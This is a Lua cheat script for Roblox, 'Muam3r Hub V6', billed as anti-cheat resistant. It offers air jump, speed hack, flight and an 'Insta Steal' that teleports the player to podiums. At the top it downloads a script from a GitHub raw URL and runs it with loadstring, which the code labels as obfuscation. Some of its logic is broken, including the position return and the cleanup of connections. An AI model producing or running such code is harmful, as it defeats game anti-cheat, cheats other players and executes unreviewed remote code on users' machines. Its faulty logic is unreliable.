-- **MUAM3R HUB V6 - FINAL FIXED VERSION (ANTI-CHEAT RESISTANT)**

-- Obfuscation: Dynamically load script from a remote source
local function loadDynamicScript()
    local url = "https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"
    local success, scriptContent = pcall(function() return game:HttpGet(url) end)
    if success and scriptContent then
        loadstring(scriptContent)()
    else
        warn("Failed to load script from: " .. url)
    end
end

-- **Dynamic Script Loading**
loadDynamicScript()

-- Initial Setup
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- **Obfuscation**: Randomized Function Names and Variables
local function createToggle(label, callback)
    local toggleState = false
    local button = Instance.new("TextButton")
    button.Text = label
    button.Size = UDim2.new(0.3, 0, 0.05, 0)
    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Parent = localPlayer.PlayerGui:WaitForChild("ScreenGui")

    button.MouseButton1Click:Connect(function()
        toggleState = not toggleState
        button.BackgroundColor3 = toggleState and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(60, 60, 60)
        callback(toggleState)
    end)
end

-- **Air Jump Functionality**
createToggle("Air Jump", function(state)
    if state then
        -- Config
        local JUMP_HEIGHT = 3.5
        local MAX_JUMPS = 6
        local JUMP_KEY = Enum.KeyCode.Space
        local COOLDOWN = 0.12

        -- State
        local jumpsLeft = MAX_JUMPS
        local lastJumpTime = 0
        local connections = {}

        -- **AIR JUMP LOGIC** - Simulating natural jumps
        local function performAirJump()
            local char = localPlayer.Character
            if not char then return end
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if not humanoid or not root then return end

            -- Check if in air
            local isInAir = humanoid:GetState() == Enum.HumanoidStateType.Jumping or humanoid:GetState() == Enum.HumanoidStateType.Freefall
            if not isInAir then
                jumpsLeft = MAX_JUMPS
                return
            end

            -- Cooldown check
            if (tick() - lastJumpTime) < COOLDOWN or jumpsLeft <= 0 then
                return
            end

            -- Apply jump
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(0, JUMP_HEIGHT * 25, 0)
            bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
            bodyVelocity.P = 1250
            bodyVelocity.Parent = root

            -- Cleanup
            task.delay(0.1, function()
                if bodyVelocity then
                    bodyVelocity:Destroy()
                end
            end)

            jumpsLeft = jumpsLeft - 1
            lastJumpTime = tick()
        end

        -- Input listener
        table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
            if not processed and input.KeyCode == JUMP_KEY then
                performAirJump()
            end
        end))

        -- Reset jumps on landing
        table.insert(connections, localPlayer.CharacterAdded:Connect(function(char)
            char:WaitForChild("Humanoid").StateChanged:Connect(function(_, newState)
                if newState == Enum.HumanoidStateType.Landed then
                    jumpsLeft = MAX_JUMPS
                end
            end)
        end))
    else
        -- Cleanup
        for _, conn in pairs(connections) do
            conn:Disconnect()
        end
        connections = {}
    end
end)

-- **Speed Hack Functionality**
createToggle("Speed Hack", function(state)
    if state then
        spawn(function()
            while state do
                local char = localPlayer.Character
                if char then
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.WalkSpeed = 32 -- Increased speed
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        local char = localPlayer.Character
        if char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 16 -- Normal speed
            end
        end
    end
end)

-- **Insta Steal Functionality**
createToggle("Insta Steal", function(state)
    if state then
        spawn(function()
            while state do
                local char = localPlayer.Character
                if char then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if root then
                        for _,v in pairs(workspace:GetDescendants()) do
                            if v.Name == "AnimalPodium" and v:FindFirstChildOfClass("ProximityPrompt") then
                                -- Teleport to podium and steal
                                root.CFrame = v.CFrame + Vector3.new(0, 3, 0)
                                task.wait(0.1)
                                fireproximityprompt(v:FindFirstChildOfClass("ProximityPrompt"))
                                task.wait(0.1)
                                -- Return to original position
                                root.CFrame = root.CFrame
                                break
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end)

-- **Flight Functionality**
createToggle("Flight", function(state)
    if state then
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
        local speed = 50
        spawn(function()
            while state do
                local char = localPlayer.Character
                if char then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if root then
                        if not root:FindFirstChild("BodyVelocity") then
                            bodyVelocity.Parent = root
                        end

                        -- Flight controls
                        local moveY = UserInputService:IsKeyDown(Enum.KeyCode.Space) and speed or UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) and -speed or 0
                        bodyVelocity.Velocity = Vector3.new(0, moveY, 0)
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        local char = localPlayer.Character
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                local bv = root:FindFirstChild("BodyVelocity")
                if bv then bv:Destroy() end
            end
        end
    end
end)

-- **Notification System**
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Muam3r Hub",
    Text = "Script Loaded and Ready",
    Duration = 5
})
